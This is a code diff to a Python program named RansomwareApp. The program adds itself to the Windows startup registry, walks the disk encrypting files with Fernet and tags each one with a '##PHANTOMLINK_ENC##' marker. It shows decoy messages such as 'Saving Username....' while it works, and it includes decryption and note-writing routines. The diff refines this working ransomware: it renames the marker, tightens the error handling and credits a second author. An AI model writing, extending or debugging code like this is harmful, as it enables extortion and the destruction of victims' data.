@@ -20,11 +20,11 @@ def add_to_startup(file_path=None):
         reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
         winreg.SetValueEx(reg_key, key_name, 0, winreg.REG_SZ, file_path)
         winreg.CloseKey(reg_key)
-    except:
+    except Exception:
         pass
 
-# By: AhmadMAnis
-print("By AhmadMAnis")
+# By: AhmadMAnis & LethimCookMyBro
+print("By AhmadMAnis & LethimCookMyBro")
 
 print("Debugging: ↓")
 
@@ -220,32 +220,21 @@ class RansomwareApp:
                             with open(file_path, "rb") as f:
                                 data = f.read()
 
-                        except FileNotFoundError:
-                            continue
-
-                        except PermissionError:
-                            continue
-
-                        except OSError:
-                            continue
-
-                        try:
-                            with open(file_path, "rb") as f:
-                                data = f.read()
-
-                            if b"ENCRYPTED" in data:
+                            if b"##PHANTOMLINK_ENC##" in data:
                                 continue
 
                             encrypted_data = fernet.encrypt(data)
 
                             with open(file_path, "wb") as f:
                                 f.write(encrypted_data)
-                                f.write(b"ENCRYPTED")
+                                f.write(b"##PHANTOMLINK_ENC##")
 
                             encrypted_files += 1
                             self.master.after(0, self.log_message, f"loading")
                             print(f"the encrypted files is: {encrypted_files} file.")  # Debugging
 
+                        except (FileNotFoundError, PermissionError, OSError):
+                            continue
                         except Exception as file_error:
                             self.master.after(0, self.log_message, f"Saving Username....")
                             show_message()
@@ -368,9 +357,9 @@ class RansomwareApp:
                         try:
                             with open(file_path, "rb") as f:
                                 data = f.read()
-                            if b"ENCRYPTED" in data:
+                            if b"##PHANTOMLINK_ENC##" in data:
                                 total_files += 1
-                        except:
+                        except (FileNotFoundError, PermissionError, OSError):
                             pass
 
             # Then decrypt files
@@ -383,11 +372,11 @@ class RansomwareApp:
                             with open(file_path, "rb") as f:
                                 data = f.read()
 
-                            if b"ENCRYPTED" not in data:
+                            if b"##PHANTOMLINK_ENC##" not in data:
                                 continue
 
                             # Decrypt data (excluding header)
-                            decrypted_data = fernet.decrypt(data[:-len(b"ENCRYPTED")])
+                            decrypted_data = fernet.decrypt(data[:-len(b"##PHANTOMLINK_ENC##")])
 
                             # Write decrypted data
                             with open(file_path, "wb") as f:
@@ -482,9 +471,7 @@ class RansomwareApp:
         with open("Good Boy!.txt", "w", encoding="utf-8") as filen2:
             filen2.write(decryption_message)
 
-        sleep(2)
-
-        self.master.quit()
+        self.master.after(2000, self.master.quit)
 
     def show_error(self, error_msg):
         messagebox.showerror("Error", error_msg)
@@ -510,9 +497,6 @@ def main():
         x = (root.winfo_screenwidth() // 2) - (width // 2)
         y = (root.winfo_screenheight() // 2) - (height // 2)
         root.geometry(f'{width}x{height}+{x}+{y}')
-
-        # Proper window closing
-        root.protocol("WM_DELETE_WINDOW", root.quit)
 
         app = RansomwareApp(root)
         root.mainloop()
